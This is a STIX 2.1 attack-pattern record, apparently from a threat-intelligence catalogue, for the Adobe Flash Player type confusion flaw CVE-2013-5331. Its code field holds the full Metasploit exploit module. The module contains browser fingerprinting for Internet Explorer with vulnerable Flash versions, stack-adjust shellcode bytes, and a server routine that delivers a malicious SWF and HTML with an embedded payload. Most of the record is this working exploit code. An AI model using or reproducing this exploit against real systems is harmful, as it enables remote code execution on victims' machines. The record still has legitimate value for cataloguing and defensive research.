{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d4ff4494-1ba0-4c7a-bb87-d7b35aea0f24",
    "created": "2024-08-14T16:42:49.425843Z",
    "modified": "2024-08-14T16:42:49.425847Z",
    "name": "\"Adobe Flash Player Type Confusion Remote Code Execution\"",
    "description": " This module exploits a type confusion vulnerability found in the ActiveX component of Adobe Flash Player. This vulnerability was found exploited in the wild in November 2013. This module has been tested successfully on IE 6 to IE 10 with Flash 11.7, 11.8 and 11.9 prior to 11.9.900.170 over Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_filters_type_confusion.rb",
            "external_id": "adobe_flash_filters_type_confusion.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5331"
        },
        {
            "source_name": "reference",
            "url": "http://helpx.adobe.com/security/products/flash-player/apsb13-28.html"
        },
        {
            "source_name": "reference",
            "url": "http://blog.malwaretracker.com/2014/01/cve-2013-5331-evaded-av-by-using.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Adobe Flash Player Type Confusion Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a type confusion vulnerability found in the ActiveX\n        component of Adobe Flash Player. This vulnerability was found exploited\n        in the wild in November 2013. This module has been tested successfully\n        on IE 6 to IE 10 with Flash 11.7, 11.8 and 11.9 prior to 11.9.900.170\n        over Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', # Vulnerability discovery and exploit in the wild\n          'bannedit', # Exploit in the wild discoverer, analysis and reporting\n          'juan vazquez' # msf module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-5331' ],\n          [ 'OSVDB', '100774'],\n          [ 'BID', '64199'],\n          [ 'URL', 'http://helpx.adobe.com/security/products/flash-player/apsb13-28.html' ],\n          [ 'URL', 'http://blog.malwaretracker.com/2014/01/cve-2013-5331-evaded-av-by-using.html' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 2000,\n          'DisableNops' => true,\n          'PrependEncoder' => stack_adjust\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n          'Retries'              => false,\n          'EXITFUNC'             => \"thread\"\n        },\n      'Platform'       => 'win',\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :activex => [\n            {\n              clsid: '{D27CDB6E-AE6D-11cf-96B8-444553540000}',\n              method: 'LoadMovie'\n            }\n          ],\n          :os_name => OperatingSystems::Match::WINDOWS,\n          :ua_name => Msf::HttpClients::IE,\n          :flash   => lambda { |ver| ver =~ /^11\\.[7|8|9]/ && ver < '11.9.900.170' }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-12-10',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n    super\n  end\n\n  def stack_adjust\n    adjust = \"\\x64\\xa1\\x18\\x00\\x00\\x00\"  # mov eax, fs:[0x18 # get teb\n    adjust << \"\\x83\\xC0\\x08\"             # add eax, byte 8 # get pointer to stacklimit\n    adjust << \"\\x8b\\x20\"                 # mov esp, [eax] # put esp at stacklimit\n    adjust << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\" # add esp, -2000 # plus a little offset\n\n    adjust\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status(\"Sending SWF...\")\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status(\"Sending HTML...\")\n    tag = retrieve_tag(cli, request)\n    profile = browser_profile[tag]\n    profile[:tried] = false unless profile.nil? # to allow request the swf\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    flash_payload = \"\"\n    get_payload(cli,target_info).unpack(\"V*\").each do |i|\n      flash_payload << \"0x#{i.to_s(16)},\"\n    end\n    flash_payload.gsub!(/,$/, \"\")\n\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"sh=<%=flash_payload%>\" />\n    <param name=\"Play\" value=\"true\" />\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2013-5331\", \"Exploit.swf\" )\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-10",
    "x_mitre_platforms": [
        "win'"
    ]
}